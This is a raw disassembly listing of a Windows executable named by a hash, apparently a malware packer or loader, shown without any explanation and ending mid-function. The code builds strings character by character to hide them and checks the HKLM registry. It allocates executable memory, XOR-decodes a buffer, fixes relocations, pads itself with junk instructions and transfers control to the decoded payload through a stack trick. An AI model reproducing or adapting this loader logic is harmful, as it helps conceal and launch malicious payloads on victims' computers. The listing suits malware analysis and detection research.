
c988467c4bfe4854c2ba4a42792516d1eb602b67a71a92098545b3574004d3c3.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	call   0x401500
  401008:	mov    eax,ds:0x42ee98
  40100d:	push   eax
  40100e:	call   0x401040
  401013:	add    esp,0x4
  401016:	mov    ds:0x42ee9c,eax
  40101b:	pop    ebp
  40101c:	ret    
  40101d:	int3   
  40101e:	int3   
  40101f:	int3   
  401020:	push   ebp
  401021:	mov    ebp,esp
  401023:	call   0x401000
  401028:	mov    eax,ds:0x42ee9c
  40102d:	push   eax
  40102e:	call   0x401980
  401033:	add    esp,0x4
  401036:	mov    ds:0x42eea0,eax
  40103b:	pop    ebp
  40103c:	ret    
  40103d:	int3   
  40103e:	int3   
  40103f:	int3   
  401040:	push   ebp
  401041:	mov    ebp,esp
  401043:	mov    eax,DWORD PTR [ebp+0x8]
  401046:	mov    eax,DWORD PTR [eax-0x4]
  401049:	pop    ebp
  40104a:	ret    
  40104b:	int3   
  40104c:	int3   
  40104d:	int3   
  40104e:	int3   
  40104f:	int3   
  401050:	push   ebp
  401051:	mov    ebp,esp
  401053:	sub    esp,0x14
  401056:	mov    eax,ds:0x42edbc
  40105b:	mov    DWORD PTR [ebp-0x10],eax
  40105e:	mov    DWORD PTR [ebp-0xc],0x425000
  401065:	mov    DWORD PTR [ebp-0x4],0x425064
  40106c:	mov    ecx,DWORD PTR [ebp-0x10]
  40106f:	movzx  edx,BYTE PTR [ecx]
  401072:	cmp    edx,0x55
  401075:	je     0x401094
  401077:	mov    eax,DWORD PTR [ebp-0x10]
  40107a:	movzx  ecx,BYTE PTR [eax]
  40107d:	cmp    ecx,0x8b
  401083:	je     0x401094
  401085:	mov    edx,DWORD PTR [ebp-0x10]
  401088:	movzx  eax,BYTE PTR [edx]
  40108b:	cmp    eax,0x6a
  40108e:	je     0x401094
  401090:	xor    eax,eax
  401092:	jmp    0x4010fc
  401094:	mov    ecx,0x52
  401099:	mov    edx,DWORD PTR [ebp-0x4]
  40109c:	mov    WORD PTR [edx],cx
  40109f:	mov    eax,0x65
  4010a4:	mov    ecx,DWORD PTR [ebp-0x4]
  4010a7:	mov    WORD PTR [ecx+0x2],ax
  4010ab:	mov    edx,0x65
  4010b0:	mov    eax,DWORD PTR [ebp-0x4]
  4010b3:	mov    WORD PTR [eax+0xa],dx
  4010b7:	mov    ecx,0x6e
  4010bc:	mov    edx,DWORD PTR [ebp-0x4]
  4010bf:	mov    WORD PTR [edx+0xc],cx
  4010c3:	mov    eax,0x4b
  4010c8:	mov    ecx,DWORD PTR [ebp-0x4]
  4010cb:	mov    WORD PTR [ecx+0xe],ax
  4010cf:	mov    edx,DWORD PTR ds:0x42edc4
  4010d5:	mov    DWORD PTR [ebp-0x8],edx
  4010d8:	lea    eax,[ebp-0x14]
  4010db:	push   eax
  4010dc:	mov    ecx,DWORD PTR [ebp-0xc]
  4010df:	push   ecx
  4010e0:	push   0x80000002
  4010e5:	call   DWORD PTR [ebp-0x8]
  4010e8:	test   eax,eax
  4010ea:	jne    0x4010f5
  4010ec:	mov    eax,0x1
  4010f1:	jmp    0x4010fc
  4010f3:	jmp    0x4010fc
  4010f5:	call   0x401050
  4010fa:	xor    eax,eax
  4010fc:	mov    esp,ebp
  4010fe:	pop    ebp
  4010ff:	ret    
  401100:	push   ebp
  401101:	mov    ebp,esp
  401103:	sub    esp,0x220
  401109:	mov    DWORD PTR [ebp-0x210],0x0
  401113:	mov    DWORD PTR [ebp-0x20c],0x425070
  40111d:	mov    DWORD PTR [ebp-0x218],0x0
  401127:	jmp    0x401138
  401129:	mov    eax,DWORD PTR [ebp-0x218]
  40112f:	add    eax,0x4
  401132:	mov    DWORD PTR [ebp-0x218],eax
  401138:	mov    ecx,DWORD PTR [ebp-0x218]
  40113e:	cmp    ecx,DWORD PTR [ebp+0xc]
  401141:	jae    0x40119e
  401143:	mov    edx,DWORD PTR [ebp-0x218]
  401149:	add    edx,0x5b3e
  40114f:	mov    DWORD PTR ds:0x42eea4,edx
  401155:	mov    eax,DWORD PTR [ebp+0x8]
  401158:	add    eax,DWORD PTR [ebp-0x218]
  40115e:	mov    DWORD PTR [ebp-0x220],eax
  401164:	mov    ecx,DWORD PTR [ebp-0x220]
  40116a:	mov    edx,DWORD PTR [ecx]
  40116c:	add    edx,DWORD PTR [ebp-0x218]
  401172:	mov    eax,DWORD PTR [ebp-0x220]
  401178:	mov    DWORD PTR [eax],edx
  40117a:	mov    ecx,DWORD PTR [ebp-0x220]
  401180:	mov    DWORD PTR [ebp-0x21c],ecx
  401186:	mov    edx,DWORD PTR [ebp-0x21c]
  40118c:	mov    eax,DWORD PTR [edx]
  40118e:	xor    eax,DWORD PTR ds:0x42eea4
  401194:	mov    ecx,DWORD PTR [ebp-0x21c]
  40119a:	mov    DWORD PTR [ecx],eax
  40119c:	jmp    0x401129
  40119e:	mov    esp,ebp
  4011a0:	pop    ebp
  4011a1:	ret    
  4011a2:	int3   
  4011a3:	int3   
  4011a4:	int3   
  4011a5:	int3   
  4011a6:	int3   
  4011a7:	int3   
  4011a8:	int3   
  4011a9:	int3   
  4011aa:	int3   
  4011ab:	int3   
  4011ac:	int3   
  4011ad:	int3   
  4011ae:	int3   
  4011af:	int3   
  4011b0:	push   ebp
  4011b1:	mov    ebp,esp
  4011b3:	sub    esp,0x2cc
  4011b9:	push   ebx
  4011ba:	push   esi
  4011bb:	push   edi
  4011bc:	mov    DWORD PTR [ebp-0x290],0x401a10
  4011c6:	mov    DWORD PTR ds:0x42eea8,ebp
  4011cc:	pusha  
  4011cd:	mov    DWORD PTR [ebp-0x294],0x0
  4011d7:	mov    DWORD PTR [ebp-0x2a4],0x80000002
  4011e1:	call   0x401050
  4011e6:	test   eax,eax
  4011e8:	je     0x401222
  4011ea:	call   0x4014d0
  4011ef:	mov    eax,ds:0x42ee98
  4011f4:	push   eax
  4011f5:	call   0x401040
  4011fa:	add    esp,0x4
  4011fd:	mov    ds:0x42ee9c,eax
  401202:	mov    ecx,DWORD PTR ds:0x42ee9c
  401208:	push   ecx
  401209:	call   0x401980
  40120e:	add    esp,0x4
  401211:	mov    ds:0x42eeac,eax
  401216:	mov    edx,DWORD PTR ds:0x42ee9c
  40121c:	mov    DWORD PTR [ebp-0x29c],edx
  401222:	mov    DWORD PTR [ebp-0x288],0x64
  40122c:	mov    DWORD PTR [ebp-0x224],0x2a
  401236:	mov    DWORD PTR [ebp-0x294],0x0
  401240:	mov    DWORD PTR [ebp-0x258],0x0
  40124a:	mov    DWORD PTR [ebp-0x284],0x1
  401254:	mov    DWORD PTR [ebp-0x21c],0x0
  40125e:	mov    eax,DWORD PTR [ebp-0x294]
  401264:	cmp    eax,DWORD PTR ds:0x42ee9c
  40126a:	jae    0x4012fb
  401270:	mov    ecx,DWORD PTR [ebp-0x29c]
  401276:	push   ecx
  401277:	mov    edx,DWORD PTR [ebp-0x288]
  40127d:	push   edx
  40127e:	call   0x401ab0
  401283:	add    esp,0x8
  401286:	mov    DWORD PTR [ebp-0x2a0],eax
  40128c:	call   0x401b80
  401291:	mov    eax,DWORD PTR [ebp-0x2a0]
  401297:	push   eax
  401298:	mov    ecx,DWORD PTR ds:0x42ee98
  40129e:	add    ecx,DWORD PTR [ebp-0x258]
  4012a4:	push   ecx
  4012a5:	mov    edx,DWORD PTR ds:0x42eeac
  4012ab:	add    edx,DWORD PTR [ebp-0x294]
  4012b1:	push   edx
  4012b2:	call   0x4017f0
  4012b7:	add    esp,0xc
  4012ba:	mov    eax,DWORD PTR [ebp-0x224]
  4012c0:	add    eax,DWORD PTR [ebp-0x288]
  4012c6:	add    eax,DWORD PTR [ebp-0x258]
  4012cc:	mov    DWORD PTR [ebp-0x258],eax
  4012d2:	mov    ecx,DWORD PTR [ebp-0x294]
  4012d8:	add    ecx,DWORD PTR [ebp-0x288]
  4012de:	mov    DWORD PTR [ebp-0x294],ecx
  4012e4:	mov    edx,DWORD PTR [ebp-0x29c]
  4012ea:	sub    edx,DWORD PTR [ebp-0x2a0]
  4012f0:	mov    DWORD PTR [ebp-0x29c],edx
  4012f6:	jmp    0x40125e
  4012fb:	mov    eax,ds:0x42ee9c
  401300:	push   eax
  401301:	mov    ecx,DWORD PTR ds:0x42eeac
  401307:	push   ecx
  401308:	call   0x401100
  40130d:	add    esp,0x8
  401310:	mov    DWORD PTR [ebp-0x258],0x0
  40131a:	mov    DWORD PTR [ebp-0x2c0],0x0
  401324:	mov    edx,DWORD PTR ds:0x42ee9c
  40132a:	push   edx
  40132b:	push   0x0
  40132d:	mov    eax,ds:0x42eea0
  401332:	push   eax
  401333:	call   0x401020
  401338:	add    esp,0xc
  40133b:	mov    ecx,DWORD PTR ds:0x42ee9c
  401341:	mov    DWORD PTR [ebp-0x2c8],ecx
  401347:	mov    edx,DWORD PTR [ebp-0x2c0]
  40134d:	cmp    edx,DWORD PTR ds:0x42ee9c
  401353:	jae    0x4013de
  401359:	mov    eax,DWORD PTR [ebp-0x2c8]
  40135f:	push   eax
  401360:	mov    ecx,DWORD PTR [ebp-0x288]
  401366:	push   ecx
  401367:	call   0x401ab0
  40136c:	add    esp,0x8
  40136f:	mov    DWORD PTR [ebp-0x2cc],eax
  401375:	mov    edx,DWORD PTR [ebp-0x2cc]
  40137b:	push   edx
  40137c:	mov    eax,ds:0x42ee98
  401381:	add    eax,DWORD PTR [ebp-0x258]
  401387:	push   eax
  401388:	mov    ecx,DWORD PTR ds:0x42eea0
  40138e:	add    ecx,DWORD PTR [ebp-0x2c0]
  401394:	push   ecx
  401395:	call   0x4017f0
  40139a:	add    esp,0xc
  40139d:	mov    edx,DWORD PTR [ebp-0x224]
  4013a3:	add    edx,DWORD PTR [ebp-0x288]
  4013a9:	add    edx,DWORD PTR [ebp-0x258]
  4013af:	mov    DWORD PTR [ebp-0x258],edx
  4013b5:	mov    eax,DWORD PTR [ebp-0x2c0]
  4013bb:	add    eax,DWORD PTR [ebp-0x288]
  4013c1:	mov    DWORD PTR [ebp-0x2c0],eax
  4013c7:	mov    ecx,DWORD PTR [ebp-0x2c8]
  4013cd:	sub    ecx,DWORD PTR [ebp-0x2cc]
  4013d3:	mov    DWORD PTR [ebp-0x2c8],ecx
  4013d9:	jmp    0x401347
  4013de:	mov    edx,DWORD PTR ds:0x42ee9c
  4013e4:	push   edx
  4013e5:	mov    eax,ds:0x42eea0
  4013ea:	push   eax
  4013eb:	call   0x401100
  4013f0:	add    esp,0x8
  4013f3:	mov    DWORD PTR [ebp-0x290],0x401a10
  4013fd:	mov    ecx,DWORD PTR ds:0x42eeac
  401403:	mov    edx,DWORD PTR ds:0x42eea0
  401409:	mov    DWORD PTR [ecx],edx
  40140b:	push   0x19000
  401410:	call   0x401980
  401415:	add    esp,0x4
  401418:	mov    ds:0x42eeb0,eax
  40141d:	mov    eax,ds:0x42eeb0
  401422:	add    eax,0x200
  401427:	mov    ds:0x42eeb4,eax
  40142c:	push   0x17700
  401431:	mov    ecx,DWORD PTR ds:0x42eeac
  401437:	push   ecx
  401438:	mov    edx,DWORD PTR ds:0x42eeb4
  40143e:	push   edx
  40143f:	call   0x4017f0
  401444:	add    esp,0xc
  401447:	mov    eax,ds:0x42eeb0
  40144c:	add    eax,0x17590
  401451:	mov    ds:0x42eeb8,eax
  401456:	popa   
  401457:	mov    ecx,ecx
  401459:	push   0x37
  40145b:	mov    eax,DWORD PTR [ebp-0x290]
  401461:	mov    ecx,esp
  401463:	sub    ecx,0x22
  401466:	mov    edx,0x1e
  40146b:	mov    DWORD PTR [ecx+edx*1+0x4],eax
  40146f:	ret    
  401470:	xor    eax,eax
  401472:	pop    edi
  401473:	pop    esi
  401474:	pop    ebx
  401475:	mov    esp,ebp
  401477:	pop    ebp
  401478:	ret    
  401479:	int3   
  40147a:	int3   
  40147b:	int3   
  40147c:	int3   
  40147d:	int3   
  40147e:	int3   
  40147f:	int3   
  401480:	push   ebp
  401481:	mov    ebp,esp
  401483:	call   0x4011b0
  401488:	pop    ebp
  401489:	ret    
  40148a:	int3   
  40148b:	int3   
  40148c:	int3   
  40148d:	int3   
  40148e:	int3   
  40148f:	int3   
  401490:	push   ebp
  401491:	mov    ebp,esp
  401493:	mov    eax,ds:0x42eebc
  401498:	sub    eax,0x8
  40149b:	shr    eax,1
  40149d:	mov    ds:0x42eebc,eax
  4014a2:	pop    ebp
  4014a3:	ret    
  4014a4:	int3   
  4014a5:	int3   
  4014a6:	int3   
  4014a7:	int3   
  4014a8:	int3   
  4014a9:	int3   
  4014aa:	int3   
  4014ab:	int3   
  4014ac:	int3   
  4014ad:	int3   
  4014ae:	int3   
  4014af:	int3   
  4014b0:	push   ebp
  4014b1:	mov    ebp,esp
  4014b3:	pop    ebp
  4014b4:	ret    0x10
  4014b7:	int3   
  4014b8:	int3   
  4014b9:	int3   
  4014ba:	int3   
  4014bb:	int3   
  4014bc:	int3   
  4014bd:	int3   
  4014be:	int3   
  4014bf:	int3   
  4014c0:	push   ebp
  4014c1:	mov    ebp,esp
  4014c3:	pop    ebp
  4014c4:	ret    0x10
  4014c7:	int3   
  4014c8:	int3   
  4014c9:	int3   
  4014ca:	int3   
  4014cb:	int3   
  4014cc:	int3   
  4014cd:	int3   
  4014ce:	int3   
  4014cf:	int3   
  4014d0:	push   ebp
  4014d1:	mov    ebp,esp
  4014d3:	sub    esp,0x10
  4014d6:	mov    DWORD PTR [ebp-0x10],0x40320a
  4014dd:	mov    DWORD PTR [ebp-0x4],0x4
  4014e4:	mov    eax,DWORD PTR [ebp-0x10]
  4014e7:	add    eax,DWORD PTR [ebp-0x4]
  4014ea:	mov    DWORD PTR [ebp-0xc],eax
  4014ed:	mov    ecx,DWORD PTR [ebp-0xc]
  4014f0:	mov    DWORD PTR [ebp-0x8],ecx
  4014f3:	mov    edx,DWORD PTR [ebp-0x8]
  4014f6:	mov    DWORD PTR ds:0x42ee98,edx
  4014fc:	mov    esp,ebp
  4014fe:	pop    ebp
  4014ff:	ret    
  401500:	push   ebp
  401501:	mov    ebp,esp
  401503:	sub    esp,0x8
  401506:	mov    DWORD PTR [ebp-0x4],0x4
  40150d:	mov    eax,DWORD PTR [ebp-0x4]
  401510:	add    eax,0x402f34
  401515:	mov    ds:0x42ee98,eax
  40151a:	mov    ecx,DWORD PTR ds:0x42edc8
  401520:	mov    DWORD PTR [ebp-0x8],ecx
  401523:	mov    esp,ebp
  401525:	pop    ebp
  401526:	ret    
  401527:	int3   
  401528:	int3   
  401529:	int3   
  40152a:	int3   
  40152b:	int3   
  40152c:	int3   
  40152d:	int3   
  40152e:	int3   
  40152f:	int3   
  401530:	push   ebp
  401531:	mov    ebp,esp
  401533:	sub    esp,0x8
  401536:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40153d:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401544:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40154b:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401552:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401559:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401560:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401567:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40156e:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401575:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40157c:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401583:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40158a:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401591:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401598:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40159f:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015a6:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015ad:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015b4:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015bb:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015c2:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015c9:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015d0:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015d7:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015de:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015e5:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015ec:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015f3:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015fa:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401601:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401608:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40160f:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401616:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40161d:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401624:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40162b:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401632:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401639:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401640:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401647:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40164e:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401655:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40165c:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401663:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40166a:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401671:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401678:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40167f:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401686:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40168d:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401694:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40169b:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016a2:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016a9:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016b0:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016b7:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016be:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016c5:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016cc:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016d3:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016da:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016e1:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016e8:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016ef:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016f6:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016fd:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401704:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40170b:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401712:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401719:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401720:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401727:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40172e:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401735:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40173c:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401743:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40174a:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401751:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401758:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40175f:	mov    DWORD PTR [ebp-0x4],0x0
  401766:	jmp    0x401771
  401768:	mov    eax,DWORD PTR [ebp-0x4]
  40176b:	add    eax,0x1
  40176e:	mov    DWORD PTR [ebp-0x4],eax
  401771:	mov    ecx,DWORD PTR [ebp-0x4]
  401774:	cmp    ecx,DWORD PTR ds:0x42eebc
  40177a:	jae    0x4017df
  40177c:	mov    edx,DWORD PTR [ebp-0x4]
  40177f:	push   edx
  401780:	mov    eax,ds:0x42eec0
  401785:	push   eax
  401786:	call   0x401a50
  40178b:	add    esp,0x8
  40178e:	sar    eax,0xc
  401791:	cmp    eax,0x3
  401794:	jne    0x4017dd
  401796:	mov    ecx,DWORD PTR [ebp-0x4]
  401799:	push   ecx
  40179a:	mov    edx,DWORD PTR ds:0x42eec0
  4017a0:	push   edx
  4017a1:	call   0x401a50
  4017a6:	add    esp,0x8
  4017a9:	and    eax,0xfff
  4017ae:	add    eax,0x5d6fc8
  4017b3:	mov    DWORD PTR [ebp-0x8],eax
  4017b6:	mov    eax,DWORD PTR [ebp+0x8]
  4017b9:	mov    ecx,DWORD PTR [ebp+0xc]
  4017bc:	add    ecx,DWORD PTR [eax]
  4017be:	mov    edx,DWORD PTR [ebp-0x8]
  4017c1:	mov    eax,DWORD PTR [ecx+edx*1-0x5d6fc8]
  4017c8:	add    eax,DWORD PTR [ebp+0x10]
  4017cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4017ce:	mov    edx,DWORD PTR [ebp+0xc]
  4017d1:	add    edx,DWORD PTR [ecx]
  4017d3:	mov    ecx,DWORD PTR [ebp-0x8]
  4017d6:	mov    DWORD PTR [edx+ecx*1-0x5d6fc8],eax
  4017dd:	jmp    0x401768
  4017df:	mov    esp,ebp
  4017e1:	pop    ebp
  4017e2:	ret    
  4017e3:	int3   
  4017e4:	int3   
  4017e5:	int3   
  4017e6:	int3   
  4017e7:	int3   
  4017e8:	int3   
  4017e9:	int3   
  4017ea:	int3   
  4017eb:	int3   
  4017ec:	int3   
  4017ed:	int3   
  4017ee:	int3   
  4017ef:	int3   
  4017f0:	push   ebp
  4017f1:	mov    ebp,esp
  4017f3:	sub    esp,0x214
  4017f9:	push   0x104
  4017fe:	lea    eax,[ebp-0x208]
  401804:	push   eax
  401805:	call   DWORD PTR ds:0x42eec4
  40180b:	mov    DWORD PTR [ebp-0x210],0x0
  401815:	jmp    0x401826
  401817:	mov    ecx,DWORD PTR [ebp-0x210]
  40181d:	add    ecx,0x1
  401820:	mov    DWORD PTR [ebp-0x210],ecx
  401826:	mov    edx,DWORD PTR [ebp-0x210]
  40182c:	cmp    edx,DWORD PTR [ebp+0x10]
  40182f:	jge    0x401928
  401835:	cmp    DWORD PTR [ebp-0x210],0x0
  40183c:	jne    0x40190d
  401842:	mov    DWORD PTR [ebp-0x214],0x425094
  40184c:	mov    eax,0x5c
  401851:	mov    ecx,DWORD PTR [ebp-0x214]
  401857:	mov    WORD PTR [ecx],ax
  40185a:	mov    edx,0x65
  40185f:	mov    eax,DWORD PTR [ebp-0x214]
  401865:	mov    WORD PTR [eax+0xa],dx
  401869:	mov    ecx,0x6d
  40186e:	mov    edx,DWORD PTR [ebp-0x214]
  401874:	mov    WORD PTR [edx+0xc],cx
  401878:	mov    eax,0x33
  40187d:	mov    ecx,DWORD PTR [ebp-0x214]
  401883:	mov    WORD PTR [ecx+0xe],ax
  401887:	mov    edx,0x32
  40188c:	mov    eax,DWORD PTR [ebp-0x214]
  401892:	mov    WORD PTR [eax+0x10],dx
  401896:	mov    ecx,0x5c
  40189b:	mov    edx,DWORD PTR [ebp-0x214]
  4018a1:	mov    WORD PTR [edx+0x12],cx
  4018a5:	mov    eax,0x73
  4018aa:	mov    ecx,DWORD PTR [ebp-0x214]
  4018b0:	mov    WORD PTR [ecx+0x16],ax
  4018b4:	mov    edx,0x65
  4018b9:	mov    eax,DWORD PTR [ebp-0x214]
  4018bf:	mov    WORD PTR [eax+0x24],dx
  4018c3:	mov    ecx,DWORD PTR [ebp-0x214]
  4018c9:	push   ecx
  4018ca:	lea    edx,[ebp-0x208]
  4018d0:	push   edx
  4018d1:	call   DWORD PTR ds:0x42eec8
  4018d7:	push   0x0
  4018d9:	push   0x80
  4018de:	push   0x3
  4018e0:	push   0x0
  4018e2:	push   0x3
  4018e4:	push   0x1
  4018e6:	lea    eax,[ebp-0x208]
  4018ec:	push   eax
  4018ed:	call   DWORD PTR ds:0x42eecc
  4018f3:	mov    DWORD PTR [ebp-0x20c],eax
  4018f9:	cmp    DWORD PTR [ebp-0x20c],0xffffffff
  401900:	je     0x40190b
  401902:	cmp    DWORD PTR [ebp-0x20c],0x0
  401909:	jne    0x40190d
  40190b:	jmp    0x401962
  40190d:	mov    ecx,DWORD PTR [ebp+0x8]
  401910:	add    ecx,DWORD PTR [ebp-0x210]
  401916:	mov    edx,DWORD PTR [ebp+0xc]
  401919:	add    edx,DWORD PTR [ebp-0x210]
  40191f:	mov    al,BYTE PTR [edx]
  401921:	mov    BYTE PTR [ecx],al
  401923:	jmp    0x401817
  401928:	mov    ecx,DWORD PTR [ebp+0x8]
  40192b:	cmp    ecx,DWORD PTR ds:0x42eeb4
  401931:	jne    0x401955
  401933:	mov    edx,DWORD PTR ds:0x42eeb0
  401939:	sub    edx,0x400000
  40193f:	push   edx
  401940:	mov    eax,ds:0x42eeb0
  401945:	push   eax
  401946:	mov    ecx,DWORD PTR ds:0x42eea0
  40194c:	push   ecx
  40194d:	call   0x401af0
  401952:	add    esp,0xc
  401955:	mov    edx,DWORD PTR [ebp-0x20c]
  40195b:	push   edx
  40195c:	call   DWORD PTR ds:0x42ed9c
  401962:	mov    esp,ebp
  401964:	pop    ebp
  401965:	ret    
  401966:	int3   
  401967:	int3   
  401968:	int3   
  401969:	int3   
  40196a:	int3   
  40196b:	int3   
  40196c:	int3   
  40196d:	int3   
  40196e:	int3   
  40196f:	int3   
  401970:	push   ebp
  401971:	mov    ebp,esp
  401973:	mov    eax,DWORD PTR [ebp+0x8]
  401976:	mov    ecx,DWORD PTR [ebp+0x8]
  401979:	add    ecx,DWORD PTR [eax+0x4]
  40197c:	mov    eax,ecx
  40197e:	pop    ebp
  40197f:	ret    
  401980:	push   ebp
  401981:	mov    ebp,esp
  401983:	sub    esp,0x220
  401989:	mov    DWORD PTR [ebp-0x8],0x215
  401990:	mov    DWORD PTR [ebp-0x220],0x3000
  40199a:	mov    DWORD PTR [ebp-0x4],0x40
  4019a1:	mov    DWORD PTR [ebp-0x214],0x0
  4019ab:	mov    DWORD PTR [ebp-0x218],0x0
  4019b5:	mov    eax,ds:0x42eda0
  4019ba:	mov    ds:0x42eec4,eax
  4019bf:	push   0x104
  4019c4:	lea    ecx,[ebp-0x210]
  4019ca:	push   ecx
  4019cb:	call   DWORD PTR ds:0x42eec4
  4019d1:	mov    edx,DWORD PTR ds:0x42eda4
  4019d7:	mov    DWORD PTR ds:0x42eec8,edx
  4019dd:	mov    eax,ds:0x42eda8
  4019e2:	mov    ds:0x42eecc,eax
  4019e7:	mov    ecx,DWORD PTR [ebp-0x4]
  4019ea:	push   ecx
  4019eb:	mov    edx,DWORD PTR [ebp-0x220]
  4019f1:	push   edx
  4019f2:	mov    eax,DWORD PTR [ebp+0x8]
  4019f5:	push   eax
  4019f6:	mov    ecx,DWORD PTR [ebp-0x214]
  4019fc:	push   ecx
  4019fd:	push   0xffffffff
  4019ff:	call   DWORD PTR ds:0x42edac
  401a05:	mov    esp,ebp
  401a07:	pop    ebp
  401a08:	ret    
  401a09:	int3   
  401a0a:	int3   
  401a0b:	int3   
  401a0c:	int3   
  401a0d:	int3   
  401a0e:	int3   
  401a0f:	int3   
  401a10:	push   ebp
  401a11:	mov    ebp,esp
  401a13:	push   ecx
  401a14:	mov    DWORD PTR [ebp-0x4],0x5e3d
  401a1b:	mov    ecx,ecx
  401a1d:	mov    ecx,ecx
  401a1f:	mov    ecx,ecx
  401a21:	mov    ecx,ecx
  401a23:	mov    edx,edx
  401a25:	mov    edx,edx
  401a27:	mov    edx,edx
  401a29:	mov    ecx,ecx
  401a2b:	mov    esp,DWORD PTR ds:0x42eea8
  401a31:	mov    ecx,ecx
  401a33:	mov    edx,edx
  401a35:	mov    ecx,ecx
  401a37:	mov    edx,edx
  401a39:	add    esp,0x4
  401a3c:	mov    edx,edx
  401a3e:	mov    ecx,ecx
  401a40:	mov    edx,edx
  401a42:	mov    edx,edx
  401a44:	jmp    DWORD PTR ds:0x42eeb8
  401a4a:	mov    esp,ebp
  401a4c:	pop    ebp
  401a4d:	ret    
  401a4e:	int3   
  401a4f:	int3   
  401a50:	push   ebp
  401a51:	mov    ebp,esp
  401a53:	sub    esp,0x18
  401a56:	mov    eax,DWORD PTR [ebp+0x8]
  401a59:	mov    DWORD PTR [ebp-0x8],eax
  401a5c:	mov    ecx,DWORD PTR [ebp+0xc]
  401a5f:	mov    DWORD PTR [ebp-0x4],ecx
  401a62:	mov    DWORD PTR [ebp-0x10],0x19c
  401a69:	mov    edx,DWORD PTR [ebp-0x8]
  401a6c:	mov    DWORD PTR ds:0x42eed0,edx
  401a72:	mov    eax,DWORD PTR [ebp-0x4]
  401a75:	mov    ds:0x42eed4,eax
  401a7a:	mov    ecx,DWORD PTR ds:0x42eed0
  401a80:	mov    DWORD PTR [ebp-0x14],ecx
  401a83:	mov    edx,DWORD PTR ds:0x42eed4
  401a89:	mov    DWORD PTR [ebp-0xc],edx
  401a8c:	mov    eax,DWORD PTR [ebp-0xc]
  401a8f:	mov    ecx,DWORD PTR [ebp-0x14]
  401a92:	lea    edx,[ecx+eax*2]
  401a95:	mov    DWORD PTR [ebp-0x18],edx
  401a98:	mov    eax,DWORD PTR [ebp-0x18]
  401a9b:	mov    DWORD PTR [ebp-0x14],eax
  401a9e:	mov    ecx,DWORD PTR [ebp-0x14]
  401aa1:	movzx  edx,WORD PTR [ecx]
  401aa4:	mov    DWORD PTR [ebp-0xc],edx
